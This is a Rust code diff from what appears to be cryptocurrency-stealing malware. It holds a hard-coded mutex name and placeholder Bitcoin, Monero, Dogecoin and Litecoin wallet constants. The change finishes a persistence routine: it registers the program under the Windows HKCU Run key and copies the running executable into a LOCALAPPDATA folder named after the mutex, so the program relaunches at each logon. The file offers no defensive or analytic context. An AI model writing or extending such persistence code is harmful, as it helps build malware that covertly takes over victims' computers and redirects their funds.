@@ -40,36 +40,38 @@ fn add_to_startup_registry(startup_registry_key: &str, exe_path: &PathBuf) -> io
  */
 
 static MUTEX: &str = "adsdfs98f76sda98fysdf";
-static FILE_NAME: &str = "stdmain.py";
 
 const BTC_ADDR: &str = "sdfdfs";
 const XMR_ADDR: &str = "dfssdf";
 const DGE_ADDR: &str = "dfssfd";
 const LTC_ADDR: &str = "dsfsdf";
 
-fn add_to_startup_registry(path: &PathBuf) -> io::Result<()> {
-    let sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run";
+fn add_to_startup_registry(path: String) -> io::Result<()> {
+    let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+
     let key = RegKey::predef(HKEY_CURRENT_USER)
         .open_subkey_with_flags(
             sub_key, 
             KEY_WRITE
         )?;
 
-    Ok(())
+    key.set_value(MUTEX,  &path)
 }
 
 fn persistence() -> io::Result<()> {
     let current_path = env::current_exe()?;
     let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(MUTEX);
 
-    create_dir_all(&desired_path)?;
-
     let file_name = current_path.file_name().unwrap();
     let destination_path = desired_path.join(file_name);
 
-    add_to_startup_registry(&destination_path);
-
-    copy(current_path, destination_path)?;
+    match add_to_startup_registry(destination_path.to_str().unwrap().to_string()) {
+        Ok(..) => {
+            create_dir_all(&desired_path)?;
+            copy(current_path, destination_path)?;
+        },
+        Err(..) => {}
+    };
 
     Ok(())
 }
